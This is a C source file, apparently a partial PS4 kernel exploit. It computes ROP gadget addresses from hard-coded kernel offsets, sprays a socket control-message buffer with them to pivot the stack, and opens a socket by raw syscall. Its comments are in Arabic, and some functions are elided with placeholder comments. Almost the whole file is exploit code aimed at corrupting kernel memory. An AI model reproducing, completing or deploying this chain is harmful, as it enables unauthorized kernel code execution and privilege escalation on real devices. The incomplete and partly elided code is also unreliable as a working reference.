#include <ps4.h>

#define OFF_PUSH_RSP_POP_RSI_RET 0x9B3EE6 
#define OFF_JMP_RSI_3B           0x049C5D 
#define OFF_LEA_RSP_RSI_20_RET   0x72B346 
#define OFF_POP_RBX_R14_RBP_JMP  0x345741 

#define CONTROL_LEN 256
#define SPRAY_COUNT 256

uint8_t control_buf[CONTROL_LEN];
struct cmsghdr { uint32_t cmsg_len; int cmsg_level; int cmsg_type; };
struct msghdr { void *msg_name; uint32_t msg_namelen; void *msg_iov; int msg_iovlen; void *msg_control; uint32_t msg_controllen; int msg_flags; };

struct cmsghdr *cmsg;
int global_sock;
int spray_socks[SPRAY_COUNT];

// ... (دوال prepare_heap و threads تبقى كما هي) ...

int _main(struct thread *td) {
    (void)td;
    initKernel(); initLibc();
    uint64_t kbase = get_kernel_base();
    
    uint64_t step1 = kbase + OFF_PUSH_RSP_POP_RSI_RET; 
    uint64_t step2 = kbase + OFF_JMP_RSI_3B;           
    uint64_t step3 = kbase + OFF_LEA_RSP_RSI_20_RET;   
    uint64_t step4 = kbase + OFF_POP_RBX_R14_RBP_JMP; 
    
    uint64_t val_rbx = 0xDEADC0DE;
    uint64_t val_r14 = 0xBAADF00D;

    prepare_heap();

    memset(control_buf, 0, CONTROL_LEN);
    cmsg = (struct cmsghdr *)control_buf;
    cmsg->cmsg_len = 0x50;

    // 1. ملء البفر بالخطوة الأولى في كل مكان (Brute Force Spray)
    for (int i = 0x48; i < CONTROL_LEN - 8; i += 8) {
        *(uint64_t *)(control_buf + i) = step1;
    }

    // 2. وضع خطة الهروب المتكررة
    for (int i = 0x50; i < 0xA0; i += 8) {
        *(uint64_t *)(control_buf + i) = step2;
    }

    // 3. وضع الـ Stack Pivot عند الإزاحة المستهدفة
    *(uint64_t *)(control_buf + 0x3b) = step3; 

    // 4. "تأمين" منطقة الـ RSP الجديد (RSI + 0x20)
    // سنغرق المنطقة المحيطة بـ 0x20 بالقيم المطلوبة لضمان النجاح
    for (int i = 0x10; i < 0x50; i += 16) {
        if (i >= 0x38 && i <= 0x40) continue; // تجنب مسح step3
        *(uint64_t *)(control_buf + i) = step4;      // الجادجيت المنفذ بعد الـ pivot
        *(uint64_t *)(control_buf + i + 8) = val_rbx; // القيمة المنشودة
    }
    
    // وضع تأكيدي عند 0x20 بالضبط
    *(uint64_t *)(control_buf + 0x20) = step4;
    *(uint64_t *)(control_buf + 0x28) = val_rbx;
    *(uint64_t *)(control_buf + 0x30) = val_r14;

    global_sock = syscall(97, 2, 2, 0);
    // ... (تشغيل الـ threads) ...
    return 0;
}
